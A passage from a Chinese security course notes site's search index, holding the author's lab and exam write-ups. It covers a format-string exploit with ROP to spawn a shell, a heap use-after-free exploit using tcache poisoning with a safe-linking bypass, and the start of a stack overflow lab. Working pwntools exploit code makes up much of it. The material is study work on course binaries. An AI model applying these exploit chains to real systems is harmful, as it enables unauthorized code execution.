<p>\u6267\u884c\u540e\u4f1a\u53d1\u73b0\u6bb5\u9519\u8bef\uff0c\u56e0\u4e3a\u5f00\u542f\u4e86 Full RELRO\uff0c\u4e0d\u80fd\u4fee\u6539 GOT \u8868\u3002</p>"},{"location":"sec/softsec/final/#rop","title":"ROP","text":"<p>\u56e0\u4e3a\u53ef\u4ee5\u4efb\u610f\u5730\u5740\u5199\uff0c\u53ef\u4ee5\u64cd\u63a7 func \u51fd\u6570\u9000\u51fa\uff0c\u6240\u4ee5\u76f4\u63a5\u4efb\u610f\u5199\u8986\u76d6\u8fd4\u56de\u5730\u5740\u8fdb\u884c ROP \u5373\u53ef\u3002</p> <p>\u9996\u5148\u9700\u8981\u6cc4\u6f0f\u6808\u5730\u5740\uff0c\u540c\u6837\u4efb\u610f\u8bfb\u6808\u4e0a\u7684 rbp \u5373\u53ef\uff1a</p> <pre><code>payload = b\"%24$p\"\np.sendline(payload)\np.recvuntil(b\"[+]: \")\nstack = int(p.recvline().strip(), 16)\nret_addr = stack - 0x200 + 0x1e8\nfmtstr_addr = stack - 0xb0\nsuccess(f\"ret_addr: {hex(ret_addr)}\")\nsuccess(f\"fmtstr_addr: {hex(fmtstr_addr)}\")\n</code></pre>"},{"location":"sec/softsec/final/#rop-call-system","title":"ROP call system","text":"<p>\u6700\u540e\u4e00\u6b21 fsb \u65f6\u5728\u6808\u4e0a\u5e03\u5c40\u4e00\u4e2a /bin/sh\uff0c\u8fd9\u4e2a\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u77e5\u9053\u7684\uff0c\u7136\u540e\u5229\u7528\u4e00\u4e2a pop rdi ; ret \u7684 gadget \u5c06\u5176\u5730\u5740\u5199\u5165 rdi\uff0c\u63a5\u4e0b\u6765\u8c03\u7528 system \u5373\u53ef\uff0c\u4f46\u4e5f\u8981\u6ce8\u610f\u6808\u5bf9\u5176\u9700\u8981\u52a0\u4e00\u4e2a ret\u3002</p> <p>\u8fd9\u91cc\u5199\u4e00\u4e2a\u5de5\u5177\u51fd\u6570\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u516b\u5b57\u8282\u7684\u5199\uff0c\u5176\u4e2d payload \u4e00\u5b9a 64 \u5b57\u8282\uff0c\u52a0\u4e0a \"[+]: AAA\" \u662f\u5bf9\u9f50\u7684\uff0c\u540e\u9762\u53ef\u4ee5\u76f4\u63a5\u52a0 addition \u5185\u5bb9\u6bd4\u5982 /bin/sh\uff0c\u8fd9\u65f6\u5185\u5bb9\u76f8\u5bf9\u4e8e\u5b57\u7b26\u4e32\u5f00\u5934\u7684\u504f\u79fb\u5c31\u662f 72\uff0c\u540e\u7eed fmtstr_addr \u5c31\u53ef\u4ee5\u83b7\u5f97 addition \u5730\u5740\uff1a</p> <pre><code>def fsb_write(addr, value, addition = b\"\"):\n    payload = fmtstr_payload(offset, {addr: value}, numbwritten=8, write_size=\"short\")\n    payload = b\"AAA\" + payload + addition\n    p.sendline(payload)\n    p.recvuntil(b\"input: \\n\")\n</code></pre> <p>\u7136\u540e ROPgadget \u5bfb\u627e gadget \u5e76\u6784\u9020 payload\uff0c\u8fd9\u91cc\u6211\u627e\u7684\u662f pwn \u5185\u90e8\u7684 gadget\uff0c\u540c\u6837\u9700\u8981\u52a0\u4e0a main+35 - 0x94b \u7684\u4ee3\u7801\u6bb5\u57fa\u5730\u5740\u504f\u79fb\uff1a</p> <pre><code>\"\"\"\npwn:\n0x00000000000009c3 : pop rdi ; ret\n0x00000000000006b6 : ret\n\"\"\"\npop_rdi_ret = main_35 - 0x94b + 0x9c3\nret = main_35 - 0x94b + 0x6b6\nbinsh_addr = fmtstr_addr + 72\nfsb_write(ret_addr, p64(pop_rdi_ret))\nfsb_write(ret_addr + 8, p64(binsh_addr))\nfsb_write(ret_addr + 16, p64(ret))\nfsb_write(ret_addr + 24, p64(system_addr), b\"/bin/sh\\x00\")\n</code></pre> <p>\u7136\u540e\u5199\u5165\u4e00\u4e2a 0xdeadbeef \u9000\u51fa func \u51fd\u6570\uff0c\u8fdb\u884c ROP\uff1a</p> <pre><code>payload = p32(0xdeadbeef)\np.sendline(payload)\np.recv()\n</code></pre> <p>\u4f46\u662f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u8fd9\u91cc\u4ec0\u4e48\u90fd\u6ca1\u53d1\u751f\u5c31\u7ed3\u675f\u4e86\u3002\u7ecf\u8fc7\u8c03\u8bd5\uff0c\u662f\u53ef\u4ee5\u6b63\u786e\u6267\u884c\u5230 system \u91cc\u7684\uff0c\u95ee\u9898\u539f\u56e0\u662f\u8fd9\u91cc /bin/sh \u5728\u6808\u4e0a\uff0csystem \u5185\u90e8\u6267\u884c\u5230 execve \u7684\u65f6\u5019\u6808\u4e0a\u90a3\u7247\u7a7a\u95f4\u53ef\u80fd\u5df2\u7ecf\u88ab\u7834\u574f\u3002</p> <p>\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 libc \u5185\u7684 /bin/sh\uff0c\u901a\u8fc7 ROPgadget \u53ef\u4ee5\u627e\u5230\uff1a</p> <pre><code>\"\"\"\npwn:\n0x00000000000009c3 : pop rdi ; ret\n0x00000000000006b6 : ret\n\nremote libc:\n0x00000000001b3d88 : /bin/sh\n\nlocal libc:\n0x00000000001d8698 : /bin/sh\n\"\"\"\npop_rdi_ret = main_35 - 0x94b + 0x9c3\nret = main_35 - 0x94b + 0x6b6\nbinsh_libc = libc_base + (0x1b3d88 if libc_path else 0x1d8698)\nfsb_write(ret_addr, p64(pop_rdi_ret))\nfsb_write(ret_addr + 8, p64(binsh_libc))\nfsb_write(ret_addr + 16, p64(ret))\nfsb_write(ret_addr + 24, p64(system_addr))\n</code></pre> <p></p>"},{"location":"sec/softsec/final/#rop-call-syscall","title":"ROP call syscall","text":"<p>\u6216\u8005\u66f4\u7a33\u5b9a\u7684\u65b9\u6cd5\u662f\u76f4\u63a5\u8c03\u7528 libc \u4e2d\u7684 syscall\uff0c\u8fd9\u6837\u5373\u4f7f /bin/sh \u5728\u6808\u4e0a\u4e5f\u65e0\u6240\u8c13\uff0c\u56e0\u4e3a syscall \u7acb\u5373\u6267\u884c\u4e0d\u4f1a\u5f71\u54cd\u5230\u6808\u4e0a\u5185\u5bb9\u3002</p> <p>execve \u7684\u8c03\u7528\u53f7\u4e3a 59\uff0c\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570 rdi\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570 rsi \u4e3a /bin/sh \u5730\u5740\uff0c\u7b2c\u4e09\u56db\u4e2a\u53c2\u6570 argv envp \u7f6e 0\uff0c\u627e\u4e00\u4e9b gadget \u7136\u540e\u6784\u9020 payload \u5373\u53ef\uff1a</p> <pre><code>\"\"\"\npwn:\n0x00000000000009c3 : pop rdi ; ret\n0x00000000000006b6 : ret\n\nremote libc:\n0x0000000000023a6a : pop rsi ; ret\n0x000000000011c35c : pop rdx ; pop rbx ; ret\n0x00000000000e433e : pop rcx ; ret\n\nlocal libc:\n0x000000000002be51 : pop rsi ; ret\n0x0000000000090529 : pop rdx ; pop rbx ; ret\n0x000000000008c6bb : pop rcx ; ret\n\"\"\"\npop_rdi_ret = main_35 - 0x94b + 0x9c3\npop_rsi_ret = libc_base + (0x23a6a if libc_path else 0x2be51)\npop_rdx_rbx_ret = libc_base + (0x11c35c if libc_path else 0x90529)\npop_rcx_ret = libc_base + (0xe433e if libc_path else 0x8c6bb)\ninfo(f\"pop rdi ; ret : {hex(pop_rdi_ret)}\")\n\nbinsh_addr = fmtstr_addr + 72\nsyscall_addr = libc_base + libc.sym[\"syscall\"]\ninfo(f\"syscall_addr: {hex(syscall_addr)}\")\n\nfsb_write(ret_addr     , p64(pop_rdi_ret))\nfsb_write(ret_addr +  8, p64(59))\nfsb_write(ret_addr + 16, p64(pop_rsi_ret))\nfsb_write(ret_addr + 24, p64(binsh_addr))\nfsb_write(ret_addr + 32, p64(pop_rdx_rbx_ret))\nfsb_write(ret_addr + 40, p64(0))\nfsb_write(ret_addr + 48, p64(0))\nfsb_write(ret_addr + 56, p64(pop_rcx_ret))\nfsb_write(ret_addr + 64, p64(0))\nfsb_write(ret_addr + 72, p64(syscall_addr), b\"/bin/sh\\x00\")\n</code></pre> <p>\u540c\u6837\u53ef\u4ee5\u6210\u529f getshell\u3002</p>"},{"location":"sec/softsec/final/#bonus","title":"bonus","text":""},{"location":"sec/softsec/final/#_2","title":"\u9006\u5411 &amp; \u6f0f\u6d1e\u5206\u6790","text":"<p>\u4f7f\u7528 IDA \u8fdb\u884c\u9006\u5411\uff0cmain \u51fd\u6570\u903b\u8f91\u5927\u81f4\uff1a</p> <pre><code>while (1) {\n    printf(\"Choice&gt; \");\n    switch (read_num()) {\n        case 0LL: create(); break;\n        case 1LL: update(); break;\n        case 2LL: show(); break;\n        case 3LL: delete(); break;\n        case 4LL: return 0LL;\n        default: continue;\n    }\n}\n</code></pre> <p>\u63a5\u4e0b\u6765 create \u51fd\u6570\u4e2d\u8bfb\u53d6\u4e00\u4e2a index\uff0c\u8fdb\u884c\u68c0\u67e5\uff0c\u9700\u8981\u6ee1\u8db3\u51e0\u4e2a\u8981\u6c42\uff1a</p> <ul> <li>index &lt;= 0xF</li> <li>*(&amp;malloc_base + 2*index) \u4e3a 0\uff08\u6ca1\u6709\u8bb0\u5f55\u8fc7\uff09</li> <li>size_record[2 * index] \u4e3a 0\uff08\u6ca1\u6709\u8bb0\u5f55\u8fc7\uff09</li> </ul> <p>\u6ee1\u8db3\u7684\u60c5\u51b5\u4e0b\u8bfb\u4e00\u4e2a size \u8981\u6c42 &lt;= 0x400\uff0c\u4e4b\u540e malloc(size) \u5e76\u5c06\u8fd4\u56de\u5730\u5740\u8bb0\u5f55\u5230 &amp;malloc_base + 2*index \u5904\uff0c\u8bb0\u5f55 size_record[2 * index] \u4e3a size\u3002</p> <p>\u5176\u4ed6\u51fd\u6570\u5c31\u66f4\u7b80\u5355\u4e86\uff0cupdate \u4f7f\u7528 read(0, ..., size_record[2*index]) \u8bfb\u53d6 stdin \u5230\u6307\u5b9a\u5806\u5757\u4e2d\u3002show \u901a\u8fc7 write(1, ..., size_record[2*index]) \u5c06\u5806\u5757\u5168\u90e8\u5185\u5bb9\u8f93\u51fa\u3002delete \u901a\u8fc7 free \u91ca\u653e\u5806\u5757\u3002</p> <p>\u53ef\u4ee5\u7f16\u5199\u5de5\u5177\u51fd\u6570\u6765\u65b9\u4fbf\u7684\u89e6\u53d1\u8fd9\u51e0\u79cd\u64cd\u4f5c\uff1a</p> <pre><code>def create(idx, size):\n    info(f\"create {idx} {size}\")\n    p.sendlineafter(b\"Choice&gt; \", b\"0\")\n    p.sendlineafter(b\"index&gt; \", str(idx).encode())\n    p.sendlineafter(b\"size&gt; \", str(size).encode())\n\ndef update(idx, content):\n    info(f\"update {idx} {content}\")\n    p.sendlineafter(b\"Choice&gt; \", b\"1\")\n    p.sendlineafter(b\"index&gt; \", str(idx).encode())\n    p.sendafter(b\"content&gt; \", content)\n\ndef show(idx):\n    info(f\"show {idx}\")\n    p.sendlineafter(b\"Choice&gt; \", b\"2\")\n    p.sendlineafter(b\"index&gt; \", str(idx).encode())\n    p.recvuntil(b\"content&gt; \")\n    # return p.recvline()\n\ndef delete(idx):\n    info(f\"delete {idx}\")\n    p.sendlineafter(b\"Choice&gt; \", b\"3\")\n    p.sendlineafter(b\"index&gt; \", str(idx).encode())\n\ndef quit():\n    p.sendlineafter(b\"Choice&gt; \", b\"4\")\n</code></pre> <p>\u8fd9\u91cc\u7684\u95ee\u9898\u5c31\u5728\u4e8e delete \u7684\u65f6\u5019\u5e76\u6ca1\u6709\u5728 malloc_base \u548c size_record \u4e2d\u4e5f\u62b9\u9664\u6389\u8bb0\u5f55\uff0c\u5bfc\u81f4\u5b58\u5728 UAF\uff0c\u53ef\u4ee5\u5229\u7528\u5806 bins \u7684\u7279\u6027\u6cc4\u6f0f libc \u5730\u5740\uff0c\u8fdb\u884c\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7b49\u3002</p>"},{"location":"sec/softsec/final/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"sec/softsec/final/#__free_hook","title":"\u52ab\u6301 __free_hook","text":"<p>\u8fd9\u9053\u9898\u76ee\u548c\u4eca\u5e74\u56fd\u8d5b\u521d\u8d5b\u7684\u4e00\u4e2a\u5806 pwn \u5f88\u50cf\uff0c\u90fd\u662f UAF + tcache \u7684\u5229\u7528\uff0c\u64cd\u4f5c\u4e5f\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u90a3\u4e2a\u9898\u76ee\u5f00\u4e86 Full RELRO\uff0c\u8fd9\u4e2a\u9898\u76ee\u53ea\u6709 Partial\uff0c\u6240\u4ee5\u63a8\u6d4b\u5e94\u8be5\u4e5f\u9002\u7528\uff0c\u5c31\u5c1d\u8bd5\u4eff\u7167\u90a3\u4e2a\u4e86\u3002</p> <p>\u9996\u5148\u662f\u5229\u7528 small bins \u4e2d\u533a\u5757\u7684 fd \u6cc4\u6f0f\u51fa libc \u57fa\u5730\u5740\u3002\u9700\u8981\u5148 free \u4e03\u4e2a chunk \u586b\u6ee1 tcache\uff0c\u63a5\u4e0b\u6765\u4e00\u4e2a\u5c31\u5230\u4e86 small bins \u4e2d\uff0c\u6b64\u65f6 show \u5373\u53ef\u8f93\u51fa fd\uff0c\u7136\u540e\u901a\u8fc7\u8c03\u8bd5 vmmap \u8ba1\u7b97\u504f\u79fb\uff0c\u5f97\u5230 libc \u57fa\u5730\u5740\uff1a</p> <pre><code>for i in range(0, 8):\n    create(i, 0x80)\n\nfor i in range(7, -1, -1):\n    delete(i)\n\nshow(0)\nlibc.address = u64(p.recvn(8)) - 0x219ce0\nsuccess(f\"libc: {hex(libc.address)}\")\ninfo(f\"__free_hook addr: {hex(libc.sym['__free_hook'])}\")\n</code></pre> <p>\u63a5\u4e0b\u6765\u5e03\u5c40 tcache \u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u3002\u521b\u5efa\u4e24\u4e2a\u65b0 chunk\uff08\u5927\u5c0f\u8981\u548c\u4e4b\u524d\u4e0d\u540c\uff0c\u4e0d\u7136 tcache \u88ab\u524d\u9762\u7684\u5360\u6ee1\u4e86\uff09\uff0c\u7136\u540e free \u6389\u6784\u6210 tcache-&gt;A-&gt;B\u3002\u8fd9\u65f6 UAF \u8986\u76d6 A \u7684 fd\uff0c\u7136\u540e create \u628a A \u5206\u51fa\u53bb\uff0c\u63a5\u4e0b\u6765\u518d create \u5c31\u4f1a\u5c06\u4e00\u4e2a chunk \u5206\u914d\u5230\u6211\u4eec\u8986\u76d6\u7684 fd \u4f4d\u7f6e\u5904\u3002</p> <p>\u8fd9\u91cc\u5c31\u662f\u8981\u8986\u76d6 __free_hook\uff1a</p> <pre><code>create(8, 0xf0)\ncreate(9, 0xf0)\ndelete(9)\ndelete(8)\nupdate(8, p64(libc.sym['__free_hook']))\ncreate(10, 0xf0)\ncreate(11, 0xf0)\n</code></pre> <p>\u8fd9\u91cc\u51fa\u73b0\u4e86\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0ccreate(11, 0xf0) \u7684\u65f6\u5019\u4f1a\u62a5\u9519 unaligned tcache chunk\uff0c\u8c03\u8bd5\u53d1\u73b0 __free_hook \u6ca1\u6709 0x10 \u5bf9\u9f50\uff0c\u8fd9\u662f glibc 2.32 \u65b0\u7684\u673a\u5236\uff0c\u8981\u6c42\u5bf9\u9f50\u3002\u6240\u4ee5\u5f80\u524d\u79fb\u52a8\u516b\u5b57\u5230 __malloc_hook \u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u7a0d\u540e\u8986\u76d6\u65f6\u7ed9 __malloc_hook \u7ee7\u7eed\u8986\u76d6 0 \u5373\u53ef\u3002</p> <p>\u7d27\u63a5\u7740\u51fa\u73b0\u4e86\u7b2c\u4e8c\u4e2a\u95ee\u9898\uff0c\u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u8fd9\u4e2a\u5206\u914d\u5230\u7684\u5730\u5740\u5e76\u4e0d\u662f\u6211\u4eec\u5199\u7684 fd\uff0c\u800c\u4e14\u5806\u5185\u5bb9\u662f\u6211\u4eec\u5199\u7684 fd\uff0c\u4f46 bins \u7ed9\u7684\u5730\u5740\u4e0d\u4e00\u6837\u3002\u901a\u8fc7\u641c\u7d22\u5f97\u77e5\u8fd9\u4e5f\u662f glibc 2.32 \u7684\u4e00\u4e2a\u65b0\u673a\u5236 safe-linking\uff0ctcache \u4e2d fd \u5730\u5740\u4f1a\u5f02\u6216\uff08\u5806\u5730\u5740&gt;&gt;12\uff09\u3002\u7ed5\u8fc7\u65b9\u5f0f\u4e5f\u5f88\u7b80\u5355\uff0c\u8bfb\u53d6\u6700\u5f00\u5934\u7684 chunk \u7684 fd \u5373\u53ef\uff0c\u8fd9\u91cc\u662f 0 \u5f02\u6216\uff08\u5806\u5730\u5740&gt;&gt;12\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u6cc4\u6f0f\u51fa\u6765\uff1a</p> <pre><code>create(8, 0xf0)\ncreate(9, 0xf0)\ndelete(9)\ndelete(8)\n\n# leak heap addr\nshow(9)\nheap_xor_base = u64(p.recvn(8))\nsuccess(f\"heap_xor_base: {hex(heap_xor_base)}\")\nupdate(8, p64((libc.sym['__free_hook'] - 0x8) ^ heap_xor_base))\ncreate(10, 0xf0)\ncreate(11, 0xf0)\n</code></pre> <p>\u8fd9\u6837\u5c31\u53ef\u4ee5\u6b63\u786e\u5206\u914d\u5806\u5757\u5230\u6211\u4eec\u6307\u5b9a\u7684\u5730\u5740\u4e0a\u4e86\u3002\u63a5\u4e0b\u6765\u8981\u5411 __free_hook \u5199\u5165\u5730\u5740\uff0c\u8fd9\u91cc\u9047\u5230\u4e86\u7b2c\u4e09\u4e2a\u95ee\u9898\uff0c\u5373\u4f7f\u5199\u5165 AAAAAAAA\uff0c\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u6bb5\u9519\u8bef\uff0c\u7591\u4f3c\u6839\u672c\u6ca1\u6709\u6267\u884c __free_hook\u3002\u641c\u7d22\u53d1\u73b0\u8fd9\u4e5f\u662f glibc 2.32 \u7684\u8865\u4e01\uff0c\u4e00\u7cfb\u5217 hook \u88ab\u5220\u6389\u4e86\uff0c\u5b58\u5728\u7b26\u53f7\u4f46\u5b9e\u9645\u4e0a\u5e76\u4e0d\u4f1a\u4f7f\u7528\u3002</p> <p>\u81f3\u6b64\u52ab\u6301 __free_hook \u7684\u65b9\u6cd5\u4e0d\u53ef\u7528\u4e86\u3002</p>"},{"location":"sec/softsec/final/#got_1","title":"\u52ab\u6301 GOT \u8868","text":"<p>\u52ab\u6301 GOT \u8868\u9700\u8981\u5148\u627e\u5230\u5b83\u7684\u5730\u5740\uff0c\u548c\u4e0a\u4e00\u4e2a\u9898\u4e00\u6837\uff0c\u9700\u8981\u6cc4\u6f0f\u4ee3\u7801\u6bb5\u57fa\u5730\u5740\u3002\u95ee\u4e86\u52a9\u6559\u5b66\u5230\u4e86\u53ef\u4ee5\u901a\u8fc7 _rtld_global-&gt;_dl_rtld_map-&gt;l_name \u6cc4\u6f0f\u51fa\u6765\uff0c\u4f46\u662f\u6cc4\u6f0f\u5c31\u8981\u8fdb\u884c\u597d\u51e0\u6b21\u8bfb\uff0c\u52ab\u6301\u4e86 GOT \u540e\uff0c\u6bd4\u5982\u5c06 free \u6539\u4e3a system\uff0c\u8fd8\u8981\u6784\u9020 /bin/sh\uff0c\u6bd4\u8f83\u590d\u6742\uff0c\u611f\u89c9\u53ef\u80fd 16 \u6b21\u64cd\u4f5c\u5e76\u4e0d\u591f\u7528\uff0c\u6240\u4ee5\u653e\u5f03\u4e86\u8fd9\u79cd\u65b9\u6cd5\u3002</p>"},{"location":"sec/softsec/final/#rop_1","title":"\u6808\u4e0a ROP","text":"<p>\u6808\u4e0a ROP \u5c31\u4e0d\u9700\u8981\u6cc4\u6f0f\u4ee3\u7801\u6bb5\u57fa\u5730\u5740\u4e86\uff0c\u76f4\u63a5\u6cc4\u6f0f\u6808\u5730\u5740\u5c31\u53ef\u4ee5\u4e86\u3002\u524d\u9762\u5df2\u7ecf\u6cc4\u6f0f\u4e86 libc \u5730\u5740\u3002libc \u4e2d\u6709 environ \u53d8\u91cf\uff0c\u5176\u503c\u662f\u6808\u4e0a main \u51fd\u6570\u7684 envp \u5730\u5740\u3002\u6839\u636e\u8c03\u8bd5\u5c31\u53ef\u4ee5\u627e\u5230\u76f8\u5bf9\u4e8e func \u8fd4\u56de\u5730\u5740\u7684\u504f\u79fb\u3002</p> <p>\u7136\u540e\u548c\u4e0a\u4e00\u9898\u4e00\u6837\u6784\u9020 syscall \u7684 ROP \u5373\u53ef\u3002\u8fd9\u91cc\u4efb\u610f\u5730\u5740\u8bfb\u548c\u5199\u90fd\u662f\u5229\u7528\u4e86\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7136\u540e show/update \u5b9e\u73b0\u7684\u3002</p> <p>\u5c1d\u8bd5\u52ab\u6301 __free_hook \u4e2d\u6cc4\u6f0f\u5806\u5730\u5740\u4e4b\u524d\u7684 exp \u90fd\u53ef\u4ee5\u91cd\u590d\u4f7f\u7528\uff0c\u540e\u9762\u7684 exp\uff1a</p> <pre><code># read environ\nupdate(8, p64(libc.sym['environ'] ^ heap_xor_base))\ncreate(10, 0xf0)\ncreate(11, 0xf0)\nshow(11)\nstack_addr = u64(p.recvn(8))\nsuccess(f\"stack_addr: {hex(stack_addr)}\")\nret_addr = stack_addr - 0x120\ninfo(f\"return addr: {hex(ret_addr)}\")\n\n# rop on stack\ncreate(12, 0xf0)\ncreate(13, 0xf0)\ndelete(13)\ndelete(12)\nupdate(12, p64((ret_addr - 0x8) ^ heap_xor_base))\ncreate(14, 0xf0)\ncreate(15, 0xf0)\n\n\"\"\"\nlibc: \n0x000000000002a3e5 : pop rdi ; ret\n0x000000000002be51 : pop rsi ; ret\n0x0000000000090529 : pop rdx ; pop rbx ; ret\n0x000000000008c6bb : pop rcx ; ret\n\"\"\"\npop_rdi_ret = libc.address + 0x2a3e5\npop_rsi_ret = libc.address + 0x2be51\npop_rdx_rbx_ret = libc.address + 0x90529\npop_rcx_ret = libc.address + 0x8c6bb\nsyscall_addr = libc.sym[\"syscall\"]\ninfo(f\"syscall addr: {hex(syscall_addr)}\")\n\npayload  = b\"/bin/sh\\x00\"\npayload += flat([\n    pop_rdi_ret,\n    59,\n    pop_rsi_ret,\n    ret_addr - 0x8,\n    pop_rdx_rbx_ret,\n    0,\n    0,\n    pop_rcx_ret,\n    0,\n    syscall_addr\n])\n\nupdate(15, payload)\nquit()\np.interactive()\n</code></pre> <p>\u521a\u597d\u7528\u5b8c 16 \u4e2a\u5806\uff0c\u8fdc\u7a0b\u901a\u8fc7\uff1a</p> <p></p>"},{"location":"sec/softsec/lab1/","title":"\u5178\u578b\u7684\u5185\u5b58\u7834\u574f\u6f0f\u6d1e\u53ca\u5176\u5229\u7528","text":"<p> \u7ea6 2230 \u4e2a\u5b57  249 \u884c\u4ee3\u7801  9 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u8f6f\u4ef6\u5b89\u5168 lab1 \u5b9e\u9a8c\u62a5\u544a\uff082023.04.29 ~ 2023.06.03\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/softsec/lab1/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>stack buffer overflow \u5b9e\u8df5\uff0830\u5206\uff09\uff1a\u8bf7\u901a\u8fc7\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u52ab\u6301\u63a7\u5236\u6d41\u5230 shellcode \u5b9e\u73b0\u62ff shell\uff0c\u5b8c\u6210\u672c\u5730\u6d4b\u8bd5\u548c\u8fdc\u7a0b\uff0c\u6700\u7ec8\u6267\u884c\u8fdc\u7a0b\u7684 flag.exe\uff0c\u62a5\u544a\u4e2d\u63d0\u4f9b\u622a\u56fe\u8bc1\u660e\u3001\u5e76\u4ee5\u9644\u4ef6\u5f62\u5f0f\u63d0\u4ea4\u653b\u51fb\u4ee3\u7801</li> <li>rop \u5b9e\u8df51\uff0820\u5206\uff09\uff0c\u8bf7\u5b8c\u6210\u5bf9 rop2 \u7a0b\u5e8f\u7684\u653b\u51fb\uff0c\u901a\u8fc7 ret2libc \u52ab\u6301\u63a7\u5236\u6d41\u5230 system \u5b9e\u73b0\u62ff shell\uff0c\u5b8c\u6210\u672c\u5730\u6d4b\u8bd5\u548c\u8fdc\u7a0b\uff0c\u6700\u7ec8\u6267\u884c\u8fdc\u7a0b\u7684 flag.exe\uff0c\u63d0\u4f9b\u622a\u56fe\u8bc1\u660e\uff0c\u5e76\u4ee5\u9644\u4ef6\u5f62\u5f0f\u63d0\u4ea4\u653b\u51fb\u4ee3\u7801</li> <li>rop \u5b9e\u8df52\uff0820\u5206\uff09\uff0c\u8bf7\u5b8c\u6210\u5bf9 rop3 \u7a0b\u5e8f\u7684\u653b\u51fb\uff0c\u901a\u8fc7\u8fc1\u6808\u540e\u518d\u8fdb\u884c ret2libc \u52ab\u6301\u63a7\u5236\u6d41\u5230 system \u5b9e\u73b0\u62ff shell\uff0c\u5b8c\u6210\u672c\u5730\u6d4b\u8bd5\u548c\u8fdc\u7a0b\uff0c\u6700\u7ec8\u6267\u884c\u8fdc\u7a0b\u7684 flag.exe\uff0c\u63d0\u4f9b\u622a\u56fe\u8bc1\u660e\uff0c\u5e76\u4ee5\u9644\u4ef6\u5f62\u5f0f\u63d0\u4ea4\u653b\u51fb\u4ee3\u7801</li> <li>fsb \u5b9e\u8df51 (10\u5206)\uff0c\u8bf7\u5728 demo \u57fa\u7840\u4e0a\uff0c\u5b66\u4e60 pwntools fmstr API \u7684\u4f7f\u7528\uff0c\u81ea\u52a8\u751f\u6210\u53ef\u4ee5\u8986\u76d6\u53d8\u91cf var \u7684\u653b\u51fb payload\uff0c\u5c06 var \u8986\u76d6\u4e3a\u81ea\u5df1\u7684\u5b66\u53f7\uff0c\u5e76\u672c\u5730\u6d4b\u8bd5\uff0c\u63d0\u4fee\u6539\u6210\u529f\u7684\u622a\u56fe\u8bc1\u660e\uff0c\u5e76\u4ee5\u9644\u4ef6\u5f62\u5f0f\u63d0\u4ea4\u653b\u51fb\u4ee3\u7801</li> <li>fsb \u5b9e\u8df52\uff0820\u5206\uff09\uff0c\u8bf7\u5b8c\u6210\u5bf9 echo \u7a0b\u5e8f\u7684\u653b\u51fb\uff0c\u901a\u8fc7 fsb \u5b9e\u73b0\u5bf9\u4e8e libc \u5730\u5740\u7684\u6cc4\u9732\u3001GOT \u5185\u5bb9\u7684\u8986\u76d6\uff0c\u6700\u7ec8\u5b9e\u73b0\u62ff shell\uff0c\u5b8c\u6210\u672c\u5730\u6d4b\u8bd5\u548c\u8fdc\u7a0b\uff0c\u6700\u7ec8\u6267\u884c\u8fdc\u7a0b\u7684 flag.exe\uff0c\u63d0\u4f9b\u622a\u56fe\u8bc1\u660e\uff0c\u5e76\u4ee5\u9644\u4ef6\u5f62\u5f0f\u63d0\u4ea4\u653b\u51fb\u4ee3\u7801</li> <li>bonus\uff08extra 20\u5206\uff09</li> </ul>"},{"location":"sec/softsec/lab1/#stack-buffer-overflow","title":"Stack Buffer Overflow","text":""},{"location":"sec/softsec/lab1/#sbof2","title":"sbof2","text":"<p>\u9996\u5148 checksec\uff0c\u53d1\u73b0\u6ca1\u6709\u4efb\u4f55\u4fdd\u62a4\uff0cNX \u5173\u95ed\uff0c\u5b58\u5728 RWX \u6bb5\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7 gdb vmmap \u5f97\u77e5 stack \u6bb5\u662f\u53ef\u6267\u884c\u7684\uff09\uff1a</p> <p>\u7a0b\u5e8f\u4e2d\u8f93\u51fa\u4e86\u5c40\u90e8\u53d8\u91cf\u6570\u7ec4 buffer \u7684\u5730\u5740\uff0cgets \u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u6240\u4ee5\u53ef\u4ee5\u5411 buffer \u4e2d\u5199\u5165 shellcode\uff0c\u7136\u540e\u6ea2\u51fa\u8986\u76d6\u8fd4\u56de\u5730\u5740\u5230 buffer \u7684\u4f4d\u7f6e\uff0c\u5b9e\u73b0 ret2shellcode\u3002</p> <p>objdump \u53ef\u4ee5\u5f97\u77e5 main \u51fd\u6570\u4e2d\u5f00\u8f9f\u4e86 0x90 \u5927\u5c0f\u7684\u6808\u7a7a\u95f4\uff0c\u4e14 buffer \u7684\u4f4d\u7f6e\u5728 rbp-0x80\uff1a <pre><code>0000000000401205 &lt;main&gt;:\n  401205:   f3 0f 1e fa             endbr64\n  401209:   55                      push   rbp\n  40120a:   48 89 e5                mov    rbp,rsp\n  40120d:   48 81 ec 90 00 00 00    sub    rsp,0x90\n  ...\n  401241:   48 8d 45 80             lea    rax,[rbp-0x80]\n  401245:   48 89 c7                mov    rdi,rax\n  401248:   b8 00 00 00 00          mov    eax,0x0\n  40124d:   e8 3e fe ff ff          call   401090 &lt;gets@plt&gt;\n</code></pre></p> <p>\u6240\u4ee5\u8981\u8986\u76d6\u5230\u8fd4\u56de\u5730\u5740\uff0c\u9700\u8981\u586b\u5145 0x80 + 8\uff08saved rbp\uff09\u4e2a\u5b57\u8282\uff0c\u540e\u9762\u63a5\u8fd4\u56de\u5730\u5740\u3002\u6240\u4ee5 exp\uff1a</p> 